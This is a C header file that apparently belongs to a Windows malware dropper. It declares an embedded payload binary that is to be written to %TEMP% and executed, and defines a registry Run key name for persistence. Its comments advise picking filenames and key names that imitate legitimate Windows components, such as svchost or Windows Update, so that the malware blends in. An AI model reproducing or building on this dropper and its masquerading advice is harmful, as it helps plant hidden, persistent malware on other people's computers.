#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <windows.h>

/**
 * Embedded payload — fill PAYLOAD_DATA with the bytes of the binary you want
 * to drop to disk and execute. PAYLOAD_SIZE must match the byte count exactly.
 *
 * To generate the array from an existing binary on Linux:
 *   xxd -i payload.exe | sed 's/unsigned char/const BYTE/;s/unsigned int/const SIZE_T/'
 *
 * Or with Python:
 *   python3 -c "
 *     d = open('payload.exe','rb').read()
 *     print('const BYTE PAYLOAD_DATA[] = {' + ','.join(hex(b) for b in d) + '};')
 *     print(f'const SIZE_T PAYLOAD_SIZE = {len(d)};')
 *   "
 */
extern const BYTE   PAYLOAD_DATA[];
extern const SIZE_T PAYLOAD_SIZE;

/**
 * Filename the payload will be written to under %TEMP%.
 * Change this to something that blends in (e.g., "svchost_upd.exe",
 * "RuntimeBroker_helper.exe", etc.).
 */
#define PAYLOAD_FILENAME "update_helper.exe"

/**
 * Registry value name used when setting the Run key for persistence.
 * Should match a plausible Windows component name.
 */
#define PAYLOAD_RUN_KEY_NAME "WindowsUpdateHelper"

#endif // PAYLOAD_H
